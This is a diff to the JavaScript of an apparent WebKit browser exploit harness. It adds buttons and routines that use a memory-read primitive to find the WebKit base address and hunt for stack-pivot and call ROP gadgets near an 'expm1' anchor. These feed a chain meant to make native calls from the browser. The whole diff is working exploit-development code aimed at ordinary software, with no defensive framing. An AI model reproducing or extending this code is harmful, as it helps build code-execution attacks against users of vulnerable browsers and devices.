@@ -26,7 +26,11 @@ import {
     g5DerivedHint,
     G5_DELTA_FROM_G0,
     G5_EXPM1_DELTA,
+    G0_EXPM1_DELTA,
     g5Expm1Hint,
+    pivotExpm1HintFor,
+    pivotG0FromG5,
+    pivotProbeHint,
     g5RvaSafe,
     webkitRvaMax,
     webkitRvaMaxFromOff,
@@ -74,7 +78,7 @@ import { prepNativeChain, stageGetpid, stageUsleep, fireNativeCall, fireUsleep, 
     CHAIN_POP_ROWS } from "./native_call.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250830aj";
+const BUILD_ID = "rw-20250830ak";
 
 const NATIVE_BISECT_STEPS = [
     { id: "smoke-now", label: "N0 smoke", title: "atomic layout+fire @ prep (chain_poops callAddr)" },
@@ -1686,6 +1690,23 @@ function wireG5Bar() {
 
     addBtn("G5 hunt low", function () { runG5HuntNear(); });
     addBtn("G5 hunt expm1", function () { runG5HuntExpm1(); });
+    addBtn("Probe G0-G4 expm1", function () { tryPivotExpm1Probe(null); });
+    addBtn("Try G0 expm1", function () {
+        const off = loadEffectiveOff();
+        const hint = pivotExpm1HintFor("wk_MOV_RDI_RSI_30_CALL", off)
+            || pivotG0FromG5(off.wk_PUSH_RDX_POP_RSP_RET);
+        if (!hint) { mark("EXPM1-SKIP", "no G0 hint"); return; }
+        if (!ready || !window.p) return;
+        const { webkitBase } = basesFromSession(off);
+        const exec = pivotExecPattern("G0", off);
+        const ok = exec && checkPivotBytes(a => read1p(window.p, a), webkitBase, hint, exec);
+        mark(ok ? "GADGET-OK" : "GADGET-BAD", "G0 expm1 +0x" + hint.toString(16)
+            + " " + gadgetBytesHex(window.p, webkitBase, hint, Math.max(exec.length, 12)));
+        if (ok) {
+            savePivotFullOverride(webkitBase, { wk_MOV_RDI_RSI_30_CALL: hint });
+            verifyPivotManual();
+        }
+    });
     addBtn("G5 scan upper", function () { runG5UpperScan(); });
     addBtn("G5 all-in", function () { runG5FullHunt(); });
     addBtn("Probe bound", function () { probeWebkitBound(); });
@@ -1716,7 +1737,7 @@ function wireG5Bar() {
 
     const hint = host.querySelector(".bar-label");
     if (hint)
-        hint.textContent = "G5 HW +0x13ec77a (expm1+0x53642a) — Verify pivot then Native call";
+        hint.textContent = "G5 @ expm1+0x53642a | G0 @ expm1+0x3d90c8 or G5-0x15d362 — Probe expm1 before low prefix scan";
 }
 
 function wireGadgetBars() {
@@ -2503,6 +2524,99 @@ async function scanPivotChunk() {
     return runPivotScanAuto();
 }
 
+function pivotFullScanRange(label, key, off, tableHint) {
+    const cap = scanCapOff();
+    const center = pivotProbeHint(key, off, off) || tableHint;
+    if (center > SCAN_LOW_MAX) {
+        return {
+            minRva: Math.max(SCAN_LOW_MAX, center - SCAN_NEAR_RADIUS),
+            maxRva: Math.min(cap, center + SCAN_NEAR_RADIUS),
+            center,
+            phase: "expm1",
+        };
+    }
+    if (center > 0) {
+        return {
+            minRva: Math.max(SCAN_PIVOT_MIN, center - SCAN_NEAR_RADIUS),
+            maxRva: Math.min(SCAN_LOW_MAX, cap, center + SCAN_NEAR_RADIUS),
+            center,
+            phase: "near",
+        };
+    }
+    return {
+        minRva: SCAN_PIVOT_MIN,
+        maxRva: Math.min(SCAN_LOW_MAX, cap),
+        center: 0,
+        phase: "low",
+    };
+}
+
+/** G5-style: read full poops bytes @ expm1+delta (and G0 @ G5−0x15d362) — no scan. */
+function probePivotExpm1Hints(p, webkitBase, off) {
+    const hits = {};
+    const read1 = a => read1p(p, a);
+    const g5rva = off.wk_PUSH_RDX_POP_RSP_RET;
+
+    if (g5rva != null) {
+        const g0hint = pivotG0FromG5(g5rva);
+        if (g0hint > 0x10000 && g5RvaSafe(g0hint, off)) {
+            const exec = pivotExecPattern("G0", off);
+            if (exec && checkPivotBytes(read1, webkitBase, g0hint, exec)) {
+                hits.wk_MOV_RDI_RSI_30_CALL = g0hint;
+                mark("EXPM1-HIT", "G0 +0x" + g0hint.toString(16)
+                    + " (G5-0x15d362) full poops OK");
+            } else if (exec) {
+                mark("EXPM1-TRY", "G0 +0x" + g0hint.toString(16) + " (G5-Δ) got "
+                    + gadgetBytesHex(p, webkitBase, g0hint, Math.max(exec.length, 12)));
+            }
+        }
+    }
+
+    for (let i = 0; i < PIVOT_ROWS.length; i++) {
+        const row = PIVOT_ROWS[i];
+        const label = row[0];
+        const key = row[1];
+        if (label === "MOV_RDI_RAX" || label === "G5") continue;
+        if (hits[key] != null) continue;
+        const hint = pivotExpm1HintFor(key, off);
+        if (!hint || !g5RvaSafe(hint, off)) continue;
+        const exec = pivotExecPattern(label, off);
+        if (!exec) continue;
+        if (checkPivotBytes(read1, webkitBase, hint, exec)) {
+            hits[key] = hint;
+            mark("EXPM1-HIT", label + " +0x" + hint.toString(16)
+                + " (expm1+delta) full poops OK");
+        } else {
+            mark("EXPM1-TRY", label + " +0x" + hint.toString(16) + " got "
+                + gadgetBytesHex(p, webkitBase, hint, Math.max(exec.length, 12)));
+        }
+    }
+
+    if (Object.keys(hits).length) {
+        savePivotFullOverride(webkitBase, hits);
+        mark("EXPM1-SAVE", Object.keys(hits).join(", "));
+    }
+    return hits;
+}
+
+function tryPivotExpm1Probe(label) {
+    if (!ready || !window.p) {
+        mark("EXPM1-SKIP", "need Start + Save bases");
+        return;
+    }
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const webkitBase = chainWebkitBase(off);
+    if (!webkitBase) {
+        mark("EXPM1-SKIP", "no webkitBase");
+        return;
+    }
+    mark("EXPM1-PROBE", "G5-style expm1 hints"
+        + (label ? " (" + label + ")" : " G0-G4"));
+    probePivotExpm1Hints(p, webkitBase, off);
+    verifyPivotManual(true);
+}
+
 function preparePivotFullScan(webkitBase, p) {
     const off = loadEffectiveOff();
     let rowIdx = PIVOT_ROWS.length;
@@ -2520,10 +2634,14 @@ function preparePivotFullScan(webkitBase, p) {
         rowIdx,
         cursor: null,
         bestHit: null,
+        scanPhase: "expm1",
     };
     if (rowIdx < PIVOT_ROWS.length) {
-        mark("FULL-SCAN-START", "scanning " + PIVOT_ROWS[rowIdx][0]
-            + " for 9-byte poops gadget in low .text");
+        const lab = PIVOT_ROWS[rowIdx][0];
+        const probe = pivotProbeHint(PIVOT_ROWS[rowIdx][1], off, off);
+        mark("FULL-SCAN-START", "scanning " + lab
+            + " full poops @ +0x" + (probe > 0 ? probe.toString(16) : "?")
+            + " (expm1/G5 method, not low prefix)");
     }
 }
 
@@ -2564,15 +2682,34 @@ async function scanPivotFullRowPhase(p, webkitBase, off) {
     }
 
     const cap = scanCapOff();
-    const range = {
-        minRva: SCAN_PIVOT_MIN,
-        maxRva: Math.min(SCAN_LOW_MAX, cap),
-    };
+    const tableHint = off[key] != null ? off[key] : pivotHint(key);
+    const scanPhase = pivotFullScan.scanPhase || "expm1";
+    let range;
+    if (scanPhase === "low") {
+        range = {
+            minRva: SCAN_PIVOT_MIN,
+            maxRva: Math.min(SCAN_LOW_MAX, cap),
+            center: tableHint,
+            phase: "low",
+        };
+        if (pivotFullScan._lowPhaseMark !== label) {
+            pivotFullScan._lowPhaseMark = label;
+            mark("FULL-SCAN-PHASE", label + " expm1 miss — low .text fallback");
+        }
+    } else {
+        range = pivotFullScanRange(label, key, off, tableHint);
+        range.phase = "expm1";
+        if (pivotFullScan._expm1PhaseMark !== label) {
+            pivotFullScan._expm1PhaseMark = label;
+            mark("FULL-SCAN-PHASE", label + " expm1/G5 +0x"
+                + range.minRva.toString(16) + "…+0x" + range.maxRva.toString(16));
+        }
+    }
     let rva = pivotFullScan.cursor != null
         ? pivotFullScan.cursor
         : (range.minRva & ~3);
     let steps = 0;
-    const hint = off[key] != null ? off[key] : pivotHint(key);
+    const hint = range.center || tableHint;
     const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;
 
     while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
@@ -2610,12 +2747,26 @@ async function scanPivotFullRowPhase(p, webkitBase, off) {
             + (hint ? " prefix-was +0x" + hint.toString(16) : "")
             + " bytes=" + gadgetBytesHex(p, webkitBase, hit.rva, Math.max(pat.length, 12)));
         pivotFullScan.rowIdx++;
+        pivotFullScan.scanPhase = "expm1";
+        pivotFullScan._expm1PhaseMark = null;
+        pivotFullScan._lowPhaseMark = null;
         return "continue";
     }
 
-    mark("FULL-SCAN-MISS", label + " — no full poops gadget in low .text (0x"
-        + range.minRva.toString(16) + "-0x" + range.maxRva.toString(16) + ")");
+    if (scanPhase === "expm1") {
+        mark("FULL-SCAN-MISS", label + " expm1/G5 cluster (0x"
+            + range.minRva.toString(16) + "-0x" + range.maxRva.toString(16) + ")");
+        pivotFullScan.scanPhase = "low";
+        pivotFullScan.cursor = null;
+        pivotFullScan.bestHit = null;
+        return "continue";
+    }
+
+    mark("FULL-SCAN-MISS", label + " — no full poops gadget (expm1 + low .text)");
     pivotFullScan.rowIdx++;
+    pivotFullScan.scanPhase = "expm1";
+    pivotFullScan._expm1PhaseMark = null;
+    pivotFullScan._lowPhaseMark = null;
     return "continue";
 }
 
@@ -2672,15 +2823,27 @@ async function runPivotFullScanAuto() {
     }
 
     preparePivotFullScan(webkitBase, p);
-    const needs = pivotRowsNeedingFullExecScan(p, webkitBase, off);
+    let needs = pivotRowsNeedingFullExecScan(p, webkitBase, off);
     if (needs.length === 0) {
         mark("FULL-SCAN-SKIP", "all G0-G4 full gadgets verify — tap Verify pivot");
         verifyPivotManual();
         return;
     }
+
+    mark("FULL-SCAN-AUTO", "G5-style: expm1 probe then near-cluster scan for "
+        + needs.map(r => r[0]).join(", "));
+    probePivotExpm1Hints(p, webkitBase, off);
+    off = loadEffectiveOff();
+    needs = pivotRowsNeedingFullExecScan(p, webkitBase, off);
+    if (needs.length === 0) {
+        mark("FULL-SCAN-SKIP", "expm1 probe found all — Verify pivot");
+        verifyPivotManual();
+        return;
+    }
+
     state("full scan " + needs.map(r => r[0]).join(", ") + "…", "warn");
-    mark("FULL-SCAN-AUTO", "9-byte poops scan: " + needs.map(r => r[0]).join(", ")
-        + " — chunked " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");
+    mark("FULL-SCAN-AUTO", "chunked near expm1: " + needs.map(r => r[0]).join(", ")
+        + " — " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");
 
     await runPivotFullScanLoop();
 }
@@ -2688,7 +2851,7 @@ async function runPivotFullScanAuto() {
 function verifyPivotManual(fromScan) {
     if (!ready || !window.p || busy) return;
     const p = window.p;
-    const off = loadEffectiveOff();
+    let off = loadEffectiveOff();
     const webkitBase = chainWebkitBase(off);
     if (!webkitBase) {
         mark("PIVOT-SKIP", "no webkitBase — Save bases first");
@@ -2717,6 +2880,19 @@ function verifyPivotManual(fromScan) {
         mark("PIVOT-FULL-BAD", fullOnlyBad.map(b => b.split(" ")[0]).join(", ")
             + " — prefix OK, poops tail differs (N5 may OOM)");
         logPivotBadBytes(p, webkitBase, off, fullOnlyBad);
+        if (!fromScan) {
+            mark("PIVOT-HINT", "tap Probe expm1 (G5 bar) or Scan full (auto)");
+            probePivotExpm1Hints(p, webkitBase, off);
+            off = loadEffectiveOff();
+            const vAfter = verifyFullChainSet(addr => read1p(p, addr), webkitBase, off);
+            if (vAfter.ok) {
+                mark("PIVOT-FULL-READY", "expm1 probe fixed G0-G4 — Fire native / N5");
+                pivotReady = verifyBisectChainSet(addr => read1p(p, addr), webkitBase, off).ok;
+                state("chain OK (full) — Fire native or N5", "ok");
+                setUi();
+                return;
+            }
+        }
     }
     if (v.pivot.good.length)
         mark("PIVOT-PREFIX-OK", v.pivot.good.join(", "));
